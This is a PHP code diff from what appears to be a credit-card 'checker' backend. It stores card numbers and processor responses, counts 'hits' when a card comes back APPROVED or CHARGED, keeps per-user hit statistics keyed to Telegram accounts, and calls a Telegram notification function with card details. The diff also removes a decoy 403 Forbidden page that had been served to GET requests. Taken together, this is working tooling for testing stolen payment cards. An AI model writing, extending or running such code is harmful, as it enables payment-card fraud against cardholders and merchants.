@@ -1,29 +1,8 @@
 <?php
-require_once __DIR__ . '/globalstats.php';
-// Removed topusers.php require_once as it's causing the extra JSON output
+// Include only the necessary functions from globalstats.php and topusers.php
+// without executing the output parts
 
-// Check if this is a GET request and show the HTML page immediately
-if ($_SERVER['REQUEST_METHOD'] === 'GET') {
-    header('Content-Type: text/html; charset=utf-8');
-    http_response_code(403);
-    
-    echo '<html style="height:100%"> 
-          <head> 
-          <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" /> 
-          <title> 403 Forbidden </title>
-          <style>@media (prefers-color-scheme:dark){body{background-color:#000!important}}</style>
-          </head> 
-          <body style="color: #444; margin:0;font: normal 14px/20px Arial, Helvetica, sans-serif; height:100%; background-color: #fff;"> 
-          <div style="height:auto; min-height:100%; "> 
-          <div style="text-align: center; width:800px; margin-left: -400px; position:absolute; top: 30%; left:50%;"> 
-          <h1 style="margin:0; font-size:150px; line-height:150px; font-weight:bold;">403</h1> 
-          <h2 style="margin-top:20px;font-size: 30px;">Forbidden </h2> 
-          <p>Access to this resource on the server is denied!</p> 
-          </div></div></body></html>';
-    
-    exit;
-}
-
+// Set headers
 header('Content-Type: application/json');
 
 // Enable error logging
@@ -171,9 +150,72 @@ try {
     // Store the database connection in a global variable for use in recordCardCheck
     $GLOBALS['pdo'] = $pdo;
     
-    // Check if user_stats table exists, create if not
-    $tableExists = $pdo->query("SELECT to_regclass('public.user_stats')")->fetchColumn();
+    // === TABLE SETUP ===
+    // Check if card_checks table exists
+    $tableExists = $pdo->query("SELECT to_regclass('public.card_checks')")->fetchColumn();
+    
     if (!$tableExists) {
+        // Create card_checks table if it doesn't exist
+        $pdo->exec("
+            CREATE TABLE card_checks (
+                id SERIAL PRIMARY KEY,
+                user_id BIGINT,
+                card_number VARCHAR(255),
+                status VARCHAR(50),
+                response TEXT,
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            );
+        ");
+        log_message("Created card_checks table");
+    }
+    
+    // Check if users table exists
+    $usersTableExists = $pdo->query("SELECT to_regclass('public.users')")->fetchColumn();
+    
+    if (!$usersTableExists) {
+        // Create users table if it doesn't exist
+        $pdo->exec("
+            CREATE TABLE users (
+                id SERIAL PRIMARY KEY,
+                telegram_id BIGINT UNIQUE,
+                name VARCHAR(255),
+                username VARCHAR(255),
+                photo_url VARCHAR(255),
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            );
+        ");
+        log_message("Created users table");
+    } else {
+        // Check if username column exists in users table
+        $columnExists = $pdo->query("
+            SELECT column_name 
+            FROM information_schema.columns 
+            WHERE table_name = 'users' AND column_name = 'username'
+        ")->fetchColumn();
+        
+        // Add username column if it doesn't exist
+        if (!$columnExists) {
+            $pdo->exec("ALTER TABLE users ADD COLUMN username VARCHAR(255)");
+            log_message("Added username column to users table");
+        }
+        
+        // Check if photo_url column exists in users table
+        $photoColumnExists = $pdo->query("
+            SELECT column_name 
+            FROM information_schema.columns 
+            WHERE table_name = 'users' AND column_name = 'photo_url'
+        ")->fetchColumn();
+        
+        // Add photo_url column if it doesn't exist
+        if (!$photoColumnExists) {
+            $pdo->exec("ALTER TABLE users ADD COLUMN photo_url VARCHAR(255)");
+            log_message("Added photo_url column to users table");
+        }
+    }
+    
+    // Check if user_stats table exists, create if not
+    $statsTableExists = $pdo->query("SELECT to_regclass('public.user_stats')")->fetchColumn();
+    if (!$statsTableExists) {
         $pdo->exec("
             CREATE TABLE user_stats (
                 id SERIAL PRIMARY KEY,
@@ -331,36 +373,56 @@ function sendTelegramNotification($card_details, $status, $response, $originalAp
 // Function to record card check in database and update user stats
 function recordCardCheck($pdo, $card_number, $status, $response) {
     try {
-        // Get user ID from session
-        $user_id = $_SESSION['user']['id'] ?? null;
-        if (!$user_id) {
-            log_message("No user ID in session, cannot record card check");
-            return;
+        // Get or create user
+        $userId = null;
+        if (isset($_SESSION['user']['telegram_id'])) {
+            // Check if user exists
+            $stmt = $pdo->prepare("SELECT id FROM users WHERE telegram_id = ?");
+            $stmt->execute([$_SESSION['user']['telegram_id']]);
+            $user = $stmt->fetch(PDO::FETCH_ASSOC);
+            
+            if ($user) {
+                $userId = $user['id'];
+            } else {
+                // Create new user
+                $stmt = $pdo->prepare("
+                    INSERT INTO users (telegram_id, name, username, photo_url) 
+                    VALUES (?, ?, ?, ?)
+                    RETURNING id
+                ");
+                $stmt->execute([
+                    $_SESSION['user']['telegram_id'],
+                    $_SESSION['user']['name'] ?? 'Unknown User',
+                    $_SESSION['user']['username'] ?? '',
+                    $_SESSION['user']['photo_url'] ?? ''
+                ]);
+                $userId = $pdo->lastInsertId();
+            }
         }
-
+        
         // Record the card check in the database
         $stmt = $pdo->prepare("INSERT INTO card_checks (user_id, card_number, status, response, created_at) VALUES (?, ?, ?, ?, NOW())");
-        $stmt->execute([$user_id, $card_number, $status, $response]);
+        $stmt->execute([$userId, $card_number, $status, $response]);
         
         // If this is a hit (APPROVED or CHARGED), update user stats
         if ($status === 'APPROVED' || $status === 'CHARGED') {
             try {
                 // Check if user stats record exists
                 $stmt = $pdo->prepare("SELECT id FROM user_stats WHERE user_id = ?");
-                $stmt->execute([$user_id]);
+                $stmt->execute([$userId]);
                 $statsRecord = $stmt->fetch(PDO::FETCH_ASSOC);
                 
                 if ($statsRecord) {
                     // Update existing record
                     $stmt = $pdo->prepare("UPDATE user_stats SET hits = hits + 1, last_hit = NOW() WHERE user_id = ?");
-                    $stmt->execute([$user_id]);
+                    $stmt->execute([$userId]);
                 } else {
                     // Create new record
                     $stmt = $pdo->prepare("INSERT INTO user_stats (user_id, hits, last_hit) VALUES (?, 1, NOW())");
-                    $stmt->execute([$user_id]);
+                    $stmt->execute([$userId]);
                 }
                 
-                log_message("Updated user stats for user ID $user_id: incrementing hits count for $status card");
+                log_message("Updated user stats for user ID $userId: incrementing hits count for $status card");
             } catch (PDOException $e) {
                 log_message("Error updating user stats: " . $e->getMessage());
                 // Continue execution even if stats update fails
